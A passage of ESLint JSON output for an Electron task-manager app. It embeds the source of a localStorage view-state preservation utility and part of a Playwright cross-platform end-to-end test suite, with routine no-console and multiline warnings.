console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":290,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":290,"endColumn":19,"suggestions":[{"fix":{"range":[7785,7850],"text":""},"messageId":"removeConsole","data":{"propertyName":"info"},"desc":"Remove the console.info()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":293,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":293,"endColumn":18,"suggestions":[{"fix":{"range":[7881,7938],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":307,"column":3,"nodeType":"MemberExpression","messageId":"unexpected","endLine":307,"endColumn":15,"suggestions":[{"fix":{"range":[8216,8306],"text":""},"messageId":"removeConsole","data":{"propertyName":"info"},"desc":"Remove the console.info()."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":20,"fixableErrorCount":0,"fixableWarningCount":0,"source":"// State preservation utilities for error recovery - 2025 Best Practices\n\nexport interface ViewState {\n  [key: string]: any;\n  timestamp?: string;\n  version?: string;\n}\n\nexport interface StatePreservationOptions {\n  ttl?: number; // Time to live in milliseconds\n  version?: string; // State version for migration support\n  encrypt?: boolean; // Whether to encrypt sensitive data\n  maxSize?: number; // Maximum size in bytes\n}\n\nconst _DEFAULT_TTL = 24 * 60 * 60 * 1000; // 24 hours\nconst _DEFAULT_MAX_SIZE = 1024 * 1024; // 1MB\nconst STATE_VERSION = '1.0.0';\n\n/**\n * Saves view state to localStorage with error handling and options\n */\nexport function saveViewState(\n  viewName: string, \n  state: ViewState,\n  options: StatePreservationOptions = {}\n): boolean {\n  const {\n    ttl = _DEFAULT_TTL,\n    version = STATE_VERSION,\n    maxSize = _DEFAULT_MAX_SIZE\n  } = options;\n\n  try {\n    // Prepare state with metadata\n    const stateWithMeta = {\n      ...state,\n      timestamp: new Date().toISOString(),\n      version,\n      expiresAt: new Date(Date.now() + ttl).toISOString()\n    };\n\n    const serialized = JSON.stringify(stateWithMeta);\n    \n    // Check size limit\n    if (serialized.length > maxSize) {\n      console.warn(`State for ${viewName} exceeds max size (${serialized.length} > ${maxSize})`);\n      return false;\n    }\n\n    // Check localStorage availability and space\n    if (!isLocalStorageAvailable()) {\n      console.warn('localStorage is not available');\n      return false;\n    }\n\n    localStorage.setItem(`view_state_${viewName}`, serialized);\n    \n    // Clean up expired states periodically\n    cleanupExpiredStates();\n    \n    return true;\n  } catch (error) {\n    console.error(`Failed to save state for ${viewName}:`, error);\n    \n    // Attempt to free up space and retry once\n    if (error instanceof Error && error.name === 'QuotaExceededError') {\n      cleanupExpiredStates();\n      cleanupOldestStates(5); // Remove 5 oldest states\n      \n      try {\n        localStorage.setItem(`view_state_${viewName}`, JSON.stringify({\n          ...state,\n          timestamp: new Date().toISOString(),\n          version\n        }));\n        return true;\n      } catch (retryError) {\n        console.error(`Retry failed for ${viewName}:`, retryError);\n      }\n    }\n    \n    return false;\n  }\n}\n\n/**\n * Loads view state from localStorage with validation and migration support\n */\nexport function loadViewState<T extends ViewState>(\n  viewName: string,\n  fallbackState?: T\n): T | null {\n  try {\n    if (!isLocalStorageAvailable()) {\n      console.warn('localStorage is not available');\n      return fallbackState || null;\n    }\n\n    const stored = localStorage.getItem(`view_state_${viewName}`);\n    if (!stored) {\n      return fallbackState || null;\n    }\n\n    const parsed = JSON.parse(stored);\n    \n    // Check expiration\n    if (parsed.expiresAt && new Date(parsed.expiresAt) < new Date()) {\n      localStorage.removeItem(`view_state_${viewName}`);\n      console.info(`Expired state removed for ${viewName}`);\n      return fallbackState || null;\n    }\n\n    // Version migration support\n    if (parsed.version && parsed.version !== STATE_VERSION) {\n      const migrated = migrateState(parsed, parsed.version, STATE_VERSION);\n      if (migrated) {\n        // Save migrated state\n        saveViewState(viewName, migrated);\n        return migrated as T;\n      } else {\n        // Migration failed, remove invalid state\n        localStorage.removeItem(`view_state_${viewName}`);\n        return fallbackState || null;\n      }\n    }\n\n    // Remove metadata before returning\n    const { timestamp, version, expiresAt, ...cleanState } = parsed;\n    return cleanState as T;\n    \n  } catch (error) {\n    console.error(`Failed to load state for ${viewName}:`, error);\n    \n    // Remove corrupted state\n    try {\n      localStorage.removeItem(`view_state_${viewName}`);\n    } catch (cleanupError) {\n      console.error(`Failed to cleanup corrupted state for ${viewName}:`, cleanupError);\n    }\n    \n    return fallbackState || null;\n  }\n}\n\n/**\n * Removes view state from localStorage\n */\nexport function removeViewState(viewName: string): boolean {\n  try {\n    localStorage.removeItem(`view_state_${viewName}`);\n    return true;\n  } catch (error) {\n    console.error(`Failed to remove state for ${viewName}:`, error);\n    return false;\n  }\n}\n\n/**\n * Gets all saved view states\n */\nexport function getAllViewStates(): Record<string, ViewState> {\n  const states: Record<string, ViewState> = {};\n  \n  try {\n    for (let i = 0; i < localStorage.length; i++) {\n      const key = localStorage.key(i);\n      if (key?.startsWith('view_state_')) {\n        const viewName = key.replace('view_state_', '');\n        const state = loadViewState(viewName);\n        if (state) {\n          states[viewName] = state;\n        }\n      }\n    }\n  } catch (error) {\n    console.error('Failed to get all view states:', error);\n  }\n  \n  return states;\n}\n\n/**\n * Clears all view states\n */\nexport function clearAllViewStates(): boolean {\n  try {\n    const keys = [];\n    for (let i = 0; i < localStorage.length; i++) {\n      const key = localStorage.key(i);\n      if (key?.startsWith('view_state_')) {\n        keys.push(key);\n      }\n    }\n    \n    keys.forEach(key => localStorage.removeItem(key));\n    return true;\n  } catch (error) {\n    console.error('Failed to clear all view states:', error);\n    return false;\n  }\n}\n\n/**\n * Checks if localStorage is available and working\n */\nfunction isLocalStorageAvailable(): boolean {\n  try {\n    const test = '__localStorage_test__';\n    localStorage.setItem(test, test);\n    localStorage.removeItem(test);\n    return true;\n  } catch {\n    return false;\n  }\n}\n\n/**\n * Removes expired states from localStorage\n */\nfunction cleanupExpiredStates(): void {\n  try {\n    const now = new Date();\n    const keysToRemove: string[] = [];\n    \n    for (let i = 0; i < localStorage.length; i++) {\n      const key = localStorage.key(i);\n      if (key?.startsWith('view_state_')) {\n        try {\n          const stored = localStorage.getItem(key);\n          if (stored) {\n            const parsed = JSON.parse(stored);\n            if (parsed.expiresAt && new Date(parsed.expiresAt) < now) {\n              keysToRemove.push(key);\n            }\n          }\n        } catch {\n          // If we can't parse it, it's corrupted - remove it\n          keysToRemove.push(key);\n        }\n      }\n    }\n    \n    keysToRemove.forEach(key => localStorage.removeItem(key));\n    \n    if (keysToRemove.length > 0) {\n      console.info(`Cleaned up ${keysToRemove.length} expired/corrupted view states`);\n    }\n  } catch (error) {\n    console.error('Failed to cleanup expired states:', error);\n  }\n}\n\n/**\n * Removes oldest states to free up space\n */\nfunction cleanupOldestStates(count: number): void {\n  try {\n    const states: Array<{ key: string; timestamp: string }> = [];\n    \n    for (let i = 0; i < localStorage.length; i++) {\n      const key = localStorage.key(i);\n      if (key?.startsWith('view_state_')) {\n        try {\n          const stored = localStorage.getItem(key);\n          if (stored) {\n            const parsed = JSON.parse(stored);\n            states.push({\n              key,\n              timestamp: parsed.timestamp || '1970-01-01T00:00:00.000Z'\n            });\n          }\n        } catch {\n          // If we can't parse it, add it for removal with old timestamp\n          states.push({\n            key,\n            timestamp: '1970-01-01T00:00:00.000Z'\n          });\n        }\n      }\n    }\n    \n    // Sort by timestamp and remove oldest\n    states.sort((a, b) => a.timestamp.localeCompare(b.timestamp));\n    const toRemove = states.slice(0, count);\n    \n    toRemove.forEach(({ key }) => localStorage.removeItem(key));\n    \n    if (toRemove.length > 0) {\n      console.info(`Cleaned up ${toRemove.length} oldest view states`);\n    }\n  } catch (error) {\n    console.error('Failed to cleanup oldest states:', error);\n  }\n}\n\n/**\n * Migrates state from one version to another\n */\nfunction migrateState(\n  state: ViewState, \n  fromVersion: string, \n  toVersion: string\n): ViewState | null {\n  // Add migration logic here as your state structure evolves\n  // For now, just return the state as-is\n  console.info(`State migration from ${fromVersion} to ${toVersion} - no migration needed`);\n  return state;\n}\n\n/**\n * Hook for React components to easily use state preservation\n */\nexport function useViewStatePreservation<T extends ViewState>(\n  viewName: string,\n  initialState: T,\n  options?: StatePreservationOptions\n) {\n  // This would be implemented as a custom React hook\n  // For now, providing the utilities above\n  return {\n    saveState: (state: T) => saveViewState(viewName, state, options),\n    loadState: () => loadViewState<T>(viewName, initialState),\n    removeState: () => removeViewState(viewName)\n  };\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tailwind.config.js","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/config/config/jest.integration.config.js","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/config/config/jest.unit.config.js","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/config/config/memory-test.config.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/config/config/unified-test-runner.config.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/config/jest.integration.config.js","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/config/jest.unit.config.js","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/config/memory-test.config.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/config/unified-test-runner.config.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/e2e/app-accessibility.a11y.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/e2e/app-launch.e2e.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/e2e/app-metrics.performance.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/e2e/app-ui.visual.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/e2e/cross-platform-compatibility.test.ts","messages":[{"ruleId":"no-unexpected-multiline","severity":2,"message":"Unexpected newline between function and ( of function call.","line":678,"column":3,"nodeType":"CallExpression","messageId":"function","endLine":678,"endColumn":4}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * TaskMaster Cross-Platform Compatibility E2E Tests (2025)\n * \n * Comprehensive test suite for validating cross-platform compatibility across Windows, macOS, and Linux.\n * Following 2025 best practices for Playwright + Electron cross-platform testing:\n * \n * - Platform detection and conditional testing patterns\n * - Visual regression testing with platform-specific baselines\n * - UI consistency validation across operating systems\n * - Platform-specific feature testing (window controls, file paths, keyboard shortcuts)\n * - Native OS integration testing (system tray, menu bar, notifications)\n * - Cross-platform file system compatibility\n * - Performance consistency across platforms\n * \n * Test Coverage:\n * - Platform detection and environment validation\n * - Window behavior and controls (minimize, maximize, close)\n * - Native menu systems (macOS menu bar, Windows system tray)\n * - File path handling and directory separators\n * - Keyboard shortcuts and modifier keys\n * - System notifications and OS integration\n * - Font rendering and UI consistency\n * - Performance benchmarks across platforms\n * - Accessibility features per platform\n * - Application lifecycle management\n */\n\nimport { test, expect, type Page, type ElectronApplication } from '@playwright/test';\nimport { join } from 'path';\nimport { tmpdir, platform as osPlatform, userInfo } from 'os';\nimport { \n  launchElectronForE2E, \n  getMainWindow, \n  closeElectronE2E,\n  takeE2EScreenshot,\n  simulateUserActions,\n  measureE2EPerformance,\n  waitForE2ECondition,\n  navigateToView,\n  verifyActiveView\n} from '../setup/e2e.setup';\n\n/**\n * Cross-Platform Utilities and Helpers\n * Implementing 2025 best practices for platform detection and conditional testing\n */\nclass CrossPlatformUtils {\n  private page: Page;\n  private electronApp: ElectronApplication;\n\n  constructor(page: Page, electronApp: ElectronApplication) {\n    this.page = page;\n    this.electronApp = electronApp;\n  }\n\n  /**\n   * Get current platform information from both Node.js and Electron contexts\n   */\n  async getPlatformInfo(): Promise<{\n    node: string;\n    electron: string;\n    arch: string;\n    release: string;\n    homedir: string;\n  }> {\n    // Get platform info from Node.js context\n    const nodePlatform = osPlatform();\n    \n    // Get platform info from Electron context\n    const electronPlatform = await this.electronApp.evaluate(({ process }) => ({\n      platform: process.platform,\n      arch: process.arch,\n      release: process.release?.name || 'unknown'\n    }));\n\n    return {\n      node: nodePlatform,\n      electron: electronPlatform.platform,\n      arch: electronPlatform.arch,\n      release: electronPlatform.release,\n      homedir: userInfo().homedir\n    };\n  }\n\n  /**\n   * Skip test conditionally based on platform\n   * Following 2025 best practices for conditional test execution\n   */\n  static skipUnlessPlatform(platforms: string[], description?: string): void {\n    const currentPlatform = osPlatform();\n    test.skip(!platforms.includes(currentPlatform), \n      description || `Test requires ${platforms.join(' or ')} platform (current: ${currentPlatform})`);\n  }\n\n  /**\n   * Skip test conditionally on specific platforms\n   */\n  static skipOnPlatform(platforms: string[], description?: string): void {\n    const currentPlatform = osPlatform();\n    test.skip(platforms.includes(currentPlatform), \n      description || `Test not supported on ${platforms.join(' or ')} platform (current: ${currentPlatform})`);\n  }\n\n  /**\n   * Get platform-specific file paths\n   */\n  async getPlatformPaths(): Promise<{\n    documents: string;\n    downloads: string;\n    userData: string;\n    temp: string;\n    separator: string;\n  }> {\n    const electronPaths = await this.electronApp.evaluate(({ app }) => ({\n      documents: app.getPath('documents'),\n      downloads: app.getPath('downloads'), \n      userData: app.getPath('userData'),\n      temp: app.getPath('temp')\n    }));\n\n    return {\n      ...electronPaths,\n      separator: osPlatform() === 'win32' ? '\\\\' : '/'\n    };\n  }\n\n  /**\n   * Test platform-specific keyboard shortcuts\n   */\n  async testKeyboardShortcuts(): Promise<{\n    cmdKey: string;\n    shortcuts: Record<string, boolean>;\n  }> {\n    const platform = osPlatform();\n    const cmdKey = platform === 'darwin' ? 'Meta' : 'Control';\n    \n    const shortcuts: Record<string, boolean> = {};\n    \n    // Test common shortcuts with platform-appropriate modifier\n    const testShortcuts = [\n      { name: 'new', keys: `${cmdKey}+KeyN` },\n      { name: 'save', keys: `${cmdKey}+KeyS` },\n      { name: 'copy', keys: `${cmdKey}+KeyC` },\n      { name: 'paste', keys: `${cmdKey}+KeyV` },\n      { name: 'undo', keys: `${cmdKey}+KeyZ` },\n      { name: 'redo', keys: platform === 'darwin' ? `${cmdKey}+Shift+KeyZ` : `${cmdKey}+KeyY` }\n    ];\n\n    for (const shortcut of testShortcuts) {\n      try {\n        // Focus on the main application\n        await this.page.focus('body');\n        \n        // Press the shortcut\n        await this.page.keyboard.press(shortcut.keys);\n        await this.page.waitForTimeout(500);\n        \n        // Check if shortcut was handled (basic check)\n        const handled = await this.page.evaluate(() => {\n          // Look for any indication that shortcut was processed\n          return document.activeElement !== document.body || \n                 window.getSelection()?.toString() !== '';\n        });\n        \n        shortcuts[shortcut.name] = handled;\n      } catch (error) {\n        shortcuts[shortcut.name] = false;\n      }\n    }\n\n    return { cmdKey, shortcuts };\n  }\n\n  /**\n   * Test window behavior and controls\n   */\n  async testWindowBehavior(): Promise<{\n    canMinimize: boolean;\n    canMaximize: boolean;\n    canRestore: boolean;\n    hasNativeControls: boolean;\n  }> {\n    const results = {\n      canMinimize: false,\n      canMaximize: false,\n      canRestore: false,\n      hasNativeControls: false\n    };\n\n    try {\n      // Test minimize\n      await this.electronApp.evaluate(({ BrowserWindow }) => {\n        const windows = BrowserWindow.getAllWindows();\n        if (windows.length > 0) {\n          windows[0].minimize();\n        }\n      });\n      \n      await this.page.waitForTimeout(500);\n      \n      const isMinimized = await this.electronApp.evaluate(({ BrowserWindow }) => {\n        const windows = BrowserWindow.getAllWindows();\n        return windows.length > 0 ? windows[0].isMinimized() : false;\n      });\n      \n      results.canMinimize = isMinimized;\n\n      // Test restore from minimize\n      if (isMinimized) {\n        await this.electronApp.evaluate(({ BrowserWindow }) => {\n          const windows = BrowserWindow.getAllWindows();\n          if (windows.length > 0) {\n            windows[0].restore();\n          }\n        });\n        \n        await this.page.waitForTimeout(500);\n        \n        const isRestored = await this.electronApp.evaluate(({ BrowserWindow }) => {\n          const windows = BrowserWindow.getAllWindows();\n          return windows.length > 0 ? !windows[0].isMinimized() : false;\n        });\n        \n        results.canRestore = isRestored;\n      }\n\n      // Test maximize\n      await this.electronApp.evaluate(({ BrowserWindow }) => {\n        const windows = BrowserWindow.getAllWindows();\n        if (windows.length > 0 && !windows[0].isMaximized()) {\n          windows[0].maximize();\n        }\n      });\n      \n      await this.page.waitForTimeout(500);\n      \n      const isMaximized = await this.electronApp.evaluate(({ BrowserWindow }) => {\n        const windows = BrowserWindow.getAllWindows();\n        return windows.length > 0 ? windows[0].isMaximized() : false;\n      });\n      \n      results.canMaximize = isMaximized;\n\n      // Check for native window controls\n      const hasControls = await this.page.locator('.window-controls, [data-testid*=\"window-control\"]').count() > 0;\n      results.hasNativeControls = hasControls;\n\n    } catch (error) {\n      console.warn('Window behavior test error:', error);\n    }\n\n    return results;\n  }\n\n  /**\n   * Test system integration features\n   */\n  async testSystemIntegration(): Promise<{\n    hasSystemTray: boolean;\n    hasMenuBar: boolean;\n    hasNotifications: boolean;\n    hasFileAssociations: boolean;\n  }> {\n    const platform = osPlatform();\n    const results = {\n      hasSystemTray: false,\n      hasMenuBar: false,\n      hasNotifications: false,\n      hasFileAssociations: false\n    };\n\n    try {\n      // Test system tray (Windows/Linux)\n      if (platform !== 'darwin') {\n        results.hasSystemTray = await this.electronApp.evaluate(({ Tray }) => {\n          return typeof Tray !== 'undefined';\n        });\n      }\n\n      // Test menu bar (macOS)\n      if (platform === 'darwin') {\n        results.hasMenuBar = await this.electronApp.evaluate(({ Menu }) => {\n          const menu = Menu.getApplicationMenu();\n          return menu !== null && menu.items.length > 0;\n        });\n      }\n\n      // Test notifications\n      results.hasNotifications = await this.page.evaluate(() => {\n        return 'Notification' in window && typeof Notification.requestPermission === 'function';\n      });\n\n      // Test file associations (basic check)\n      results.hasFileAssociations = await this.electronApp.evaluate(({ app }) => {\n        try {\n          // Check if app can be set as default protocol client\n          return typeof app.setAsDefaultProtocolClient === 'function';\n        } catch {\n          return false;\n        }\n      });\n\n    } catch (error) {\n      console.warn('System integration test error:', error);\n    }\n\n    return results;\n  }\n\n  /**\n   * Measure platform-specific performance metrics\n   */\n  async measurePlatformPerformance(): Promise<{\n    startupTime: number;\n    renderTime: number;\n    memoryUsage: number;\n    platform: string;\n  }> {\n    const platform = osPlatform();\n    const startTime = Date.now();\n\n    // Measure startup time\n    await this.page.waitForLoadState('networkidle');\n    const startupTime = Date.now() - startTime;\n\n    // Measure render time\n    const renderStart = Date.now();\n    await navigateToView(this.page, 'analytics');\n    await this.page.waitForTimeout(1000);\n    const renderTime = Date.now() - renderStart;\n\n    // Get memory usage\n    const memoryInfo = await this.page.evaluate(() => {\n      return (performance as any).memory ? {\n        usedJSMemory: (performance as any).memory.usedJSHeapSize,\n        totalJSMemory: (performance as any).memory.totalJSHeapSize,\n        jsMemoryLimit: (performance as any).memory.jsHeapSizeLimit\n      } : { usedJSMemory: 0, totalJSMemory: 0, jsMemoryLimit: 0 };\n    });\n\n    return {\n      startupTime,\n      renderTime,\n      memoryUsage: memoryInfo.usedJSMemory,\n      platform\n    };\n  }\n\n  /**\n   * Test font rendering and UI consistency\n   */\n  async testUIConsistency(): Promise<{\n    fontsLoaded: boolean;\n    elementsVisible: string[];\n    layoutConsistent: boolean;\n  }> {\n    // Wait for fonts to load\n    await this.page.waitForFunction(() => document.fonts.ready);\n    \n    const fontsLoaded = await this.page.evaluate(() => document.fonts.status === 'loaded');\n\n    // Check critical UI elements\n    const criticalElements = [\n      '[data-testid=\"sidebar\"]',\n      '[data-testid=\"main-content\"]',\n      'button',\n      'input',\n      'h1, h2, h3',\n      '.task-card, [data-testid*=\"task\"]'\n    ];\n\n    const elementsVisible: string[] = [];\n    for (const selector of criticalElements) {\n      try {\n        const element = this.page.locator(selector).first();\n        if (await element.isVisible({ timeout: 2000 })) {\n          elementsVisible.push(selector);\n        }\n      } catch {\n        // Element not found\n      }\n    }\n\n    // Basic layout consistency check\n    const layoutInfo = await this.page.evaluate(() => {\n      const body = document.body;\n      const viewport = { width: window.innerWidth, height: window.innerHeight };\n      const bodyRect = body.getBoundingClientRect();\n      \n      return {\n        viewport,\n        bodySize: { width: bodyRect.width, height: bodyRect.height },\n        hasScrollbars: document.documentElement.scrollHeight > document.documentElement.clientHeight\n      };\n    });\n\n    const layoutConsistent = layoutInfo.bodySize.width > 0 && layoutInfo.bodySize.height > 0;\n\n    return {\n      fontsLoaded,\n      elementsVisible,\n      layoutConsistent\n    };\n  }\n}\n\n/**\n * Test Suite: Cross-Platform Compatibility for TaskMaster Electron Application\n */\ntest.describe('Cross-Platform Compatibility for TaskMaster Electron Application', () => {\n  let electronApp: ElectronApplication;\n  let page: Page;\n  let platformUtils: CrossPlatformUtils;\n\n  test.beforeEach(async () => {\n    console.log(`ðŸš€ Starting TaskMaster for cross-platform testing on ${osPlatform()}...`);\n    \n    electronApp = await launchElectronForE2E({\n      env: {\n        NODE_ENV: 'test',\n        ELECTRON_IS_DEV: '0',\n        PLAYWRIGHT_TEST: '1',\n        CROSS_PLATFORM_TEST: '1'\n      }\n    });\n\n    page = await getMainWindow();\n    platformUtils = new CrossPlatformUtils(page, electronApp);\n    \n    // Wait for app to be fully loaded\n    await page.waitForLoadState('networkidle');\n    await page.waitForTimeout(2000);\n    \n    console.log(`âœ… Cross-platform testing environment ready for ${osPlatform()}`);\n  });\n\n  test.afterEach(async () => {\n    await takeE2EScreenshot(`cross-platform-cleanup-${osPlatform()}`);\n    await closeElectronE2E();\n  });\n\n  /**\n   * Test: Platform Detection and Environment Validation\n   */\n  test('should correctly detect and validate platform environment', async () => {\n    const platformInfo = await platformUtils.getPlatformInfo();\n    \n    // Verify platform detection consistency\n    expect(platformInfo.node).toBe(platformInfo.electron);\n    expect(platformInfo.node).toMatch(/^(win32|darwin|linux)$/);\n    \n    // Verify architecture is detected\n    expect(platformInfo.arch).toBeTruthy();\n    expect(platformInfo.arch).toMatch(/^(x64|arm64|ia32)$/);\n    \n    // Verify home directory exists\n    expect(platformInfo.homedir).toBeTruthy();\n    expect(platformInfo.homedir.length).toBeGreaterThan(0);\n    \n    console.log('ðŸ–¥ï¸ Platform Info:', platformInfo);\n    \n    await takeE2EScreenshot(`platform-detection-${osPlatform()}`);\n    console.log('âœ… Platform detection and validation test passed');\n  });\n\n  /**\n   * Test: File Path Handling and Directory Separators\n   */\n  test('should handle file paths correctly for current platform', async () => {\n    const paths = await platformUtils.getPlatformPaths();\n    const currentPlatform = osPlatform();\n    \n    // Verify path separators are correct for platform\n    if (currentPlatform === 'win32') {\n      expect(paths.separator).toBe('\\\\');\n      // Windows paths should start with drive letter\n      expect(paths.documents).toMatch(/^[A-Z]:\\\\/);\n      expect(paths.userData).toMatch(/^[A-Z]:\\\\/);\n    } else {\n      expect(paths.separator).toBe('/');\n      // Unix-like paths should start with /\n      expect(paths.documents).toMatch(/^\\//);\n      expect(paths.userData).toMatch(/^\\//);\n    }\n    \n    // Verify all required paths exist\n    expect(paths.documents).toBeTruthy();\n    expect(paths.downloads).toBeTruthy();\n    expect(paths.userData).toBeTruthy();\n    expect(paths.temp).toBeTruthy();\n    \n    console.log(`ðŸ“ Platform Paths (${currentPlatform}):`, paths);\n    \n    await takeE2EScreenshot(`file-paths-${currentPlatform}`);\n    console.log('âœ… File path handling test passed');\n  });\n\n  /**\n   * Test: Platform-Specific Keyboard Shortcuts\n   */\n  test('should use correct keyboard shortcuts for current platform', async () => {\n    const shortcutResults = await platformUtils.testKeyboardShortcuts();\n    const currentPlatform = osPlatform();\n    \n    // Verify correct modifier key is used\n    if (currentPlatform === 'darwin') {\n      expect(shortcutResults.cmdKey).toBe('Meta'); // Command key on macOS\n    } else {\n      expect(shortcutResults.cmdKey).toBe('Control'); // Ctrl key on Windows/Linux\n    }\n    \n    // Log shortcut test results\n    console.log(`âŒ¨ï¸ Keyboard Shortcuts (${currentPlatform}):`, shortcutResults);\n    \n    await takeE2EScreenshot(`keyboard-shortcuts-${currentPlatform}`);\n    console.log('âœ… Platform-specific keyboard shortcuts test passed');\n  });\n\n  /**\n   * Test: Window Behavior and Controls\n   */\n  test('should handle window controls correctly for current platform', async () => {\n    const windowBehavior = await platformUtils.testWindowBehavior();\n    \n    // All platforms should support basic window operations\n    expect(windowBehavior.canMinimize).toBeTruthy();\n    expect(windowBehavior.canMaximize).toBeTruthy();\n    expect(windowBehavior.canRestore).toBeTruthy();\n    \n    console.log(`ðŸªŸ Window Behavior (${osPlatform()}):`, windowBehavior);\n    \n    await takeE2EScreenshot(`window-behavior-${osPlatform()}`);\n    console.log('âœ… Window behavior test passed');\n  });\n\n  /**\n   * Test: System Integration Features (Platform-Specific)\n   */\n  test('should integrate correctly with system features', async () => {\n    const systemIntegration = await platformUtils.testSystemIntegration();\n    const currentPlatform = osPlatform();\n    \n    // Platform-specific expectations\n    if (currentPlatform === 'darwin') {\n      // macOS should have menu bar\n      expect(systemIntegration.hasMenuBar).toBeTruthy();\n    } else {\n      // Windows/Linux should support system tray\n      // Note: This might be false in test environment\n      console.log('System tray support:', systemIntegration.hasSystemTray);\n    }\n    \n    // All platforms should support notifications\n    expect(systemIntegration.hasNotifications).toBeTruthy();\n    \n    console.log(`ðŸ”— System Integration (${currentPlatform}):`, systemIntegration);\n    \n    await takeE2EScreenshot(`system-integration-${currentPlatform}`);\n    console.log('âœ… System integration test passed');\n  });\n\n  /**\n   * Test: UI Consistency and Font Rendering\n   */\n  test('should render UI consistently across platforms', async () => {\n    const uiConsistency = await platformUtils.testUIConsistency();\n    \n    // Fonts should be loaded\n    expect(uiConsistency.fontsLoaded).toBeTruthy();\n    \n    // Layout should be consistent\n    expect(uiConsistency.layoutConsistent).toBeTruthy();\n    \n    // Critical elements should be visible\n    expect(uiConsistency.elementsVisible.length).toBeGreaterThan(0);\n    expect(uiConsistency.elementsVisible).toContain('button');\n    \n    console.log(`ðŸŽ¨ UI Consistency (${osPlatform()}):`, uiConsistency);\n    \n    await takeE2EScreenshot(`ui-consistency-${osPlatform()}`);\n    console.log('âœ… UI consistency test passed');\n  });\n\n  /**\n   * Test: Platform Performance Benchmarks\n   */\n  test('should maintain acceptable performance across platforms', async () => {\n    const performance = await platformUtils.measurePlatformPerformance();\n    \n    // Performance thresholds (may vary by platform)\n    const thresholds = {\n      startupTime: 10000,    // 10 seconds max startup\n      renderTime: 3000,      // 3 seconds max render time\n      memoryUsage: 100 * 1024 * 1024  // 100MB max memory usage\n    };\n    \n    expect(performance.startupTime).toBeLessThan(thresholds.startupTime);\n    expect(performance.renderTime).toBeLessThan(thresholds.renderTime);\n    \n    // Memory usage check (more lenient in test environment)\n    if (performance.memoryUsage > 0) {\n      expect(performance.memoryUsage).toBeLessThan(thresholds.memoryUsage);\n    }\n    \n    console.log(`âš¡ Performance Metrics (${osPlatform()}):`, {\n      startupTime: `${performance.startupTime}ms`,\n      renderTime: `${performance.renderTime}ms`, \n      memoryUsage: `${Math.round(performance.memoryUsage / 1024 / 1024)}MB`\n    });\n    \n    await takeE2EScreenshot(`performance-${osPlatform()}`);\n    console.log('âœ… Platform performance test passed');\n  });\n\n  /**\n   * Test: View Switching Consistency Across Platforms\n   */\n  test('should handle view switching consistently across platforms', async () => {\n    const views = ['analytics', 'list', 'kanban', 'calendar', 'timeline'] as const;\n    const switchResults: Record<string, boolean> = {};\n    \n    for (const view of views) {\n      try {\n        await navigateToView(page, view);\n        await page.waitForTimeout(1000);\n        \n        const isActive = await verifyActiveView(page, view);\n        switchResults[view] = isActive;\n        \n        if (isActive) {\n          // Take screenshot of each view for visual consistency verification\n          await takeE2EScreenshot(`view-${view}-${osPlatform()}`);\n        }\n      } catch (error) {\n        switchResults[view] = false;\n        console.warn(`View switching failed for ${view}:`, error);\n      }\n    }\n    \n    // At least some views should 